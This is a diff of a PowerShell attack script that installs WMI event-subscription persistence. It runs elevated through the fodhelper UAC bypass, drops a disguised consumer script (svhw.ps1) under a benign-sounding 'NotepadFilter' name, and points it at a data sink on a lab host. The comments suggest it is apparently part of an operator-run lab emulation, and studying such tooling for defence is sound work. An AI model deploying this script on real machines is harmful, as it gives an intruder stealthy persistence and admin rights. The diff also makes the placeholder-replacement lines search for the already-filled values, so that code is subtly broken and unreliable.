@@ -1,12 +1,12 @@
-﻿# S3 - WMI persistence install. Runs elevated (hidden) via the fodhelper UAC bypass.
+# S3 - WMI persistence install. Runs elevated (hidden) via the fodhelper UAC bypass.
 # Reads payloads/consumer.ps1, injects the run-scoped config, writes the consumer to
 # C:\Windows\Temp\svhw.ps1, then registers the filter / consumer / binding
 # (idempotent: prior objects of the same names are removed first).
 #
 # Run-scoped config (embedded at build time by the operator):
-$RunId    = "__RUN_ID__"
-$SinkBase = "__SINK_BASE__"   # e.g. http://<lab-host>:9180
-$VictimHost = "__HOST__"
+$RunId    = "RUN-20261003-04"
+$SinkBase = "http://192.168.106.1:9180"   # e.g. http://<lab-host>:9180
+$VictimHost = "wmi"
 
 $ConsumerPath = "C:\Windows\Temp\svhw.ps1"
 $FilterName   = "NotepadFilter"
@@ -21,7 +21,7 @@ if (-not (Test-Path $source)) { Write-Host "[S3] missing consumer.ps1 next to in
 # is the guest probe (Get-FileHash of svhw.ps1) taken by the operator and stored as a
 # separate measurement, compared with the staged artifact by the acceptance verifier.
 $body = [System.IO.File]::ReadAllText($source, [System.Text.Encoding]::UTF8)
-$body = $body.Replace("__RUN_ID__", $RunId).Replace("__SINK_BASE__", $SinkBase).Replace("__HOST__", $VictimHost)
+$body = $body.Replace("RUN-20261003-04", $RunId).Replace("http://192.168.106.1:9180", $SinkBase).Replace("wmi", $VictimHost)
 [System.IO.File]::WriteAllText($ConsumerPath, $body,
     (New-Object System.Text.UTF8Encoding($false)))
 if (-not (Test-Path $ConsumerPath)) { Write-Host "[S3] consumer write failed"; exit 1 }
@@ -117,7 +117,7 @@ try {
             groups_medium = [bool]($groups -match 'Medium Mandatory Level')
         }
     }
-    [System.IO.File]::WriteAllText($elevOut, ($elev | ConvertTo-Json -Depth 5), (New-Object System.Text.UTF8Encoding($false)))
+    $elev | ConvertTo-Json -Depth 5 | Set-Content -Path $elevOut -Encoding UTF8
     Write-Host "[S3] elevation-after recorded at $elevOut"
 } catch {
     Write-Host "[S3] elevation-after capture failed: $_"
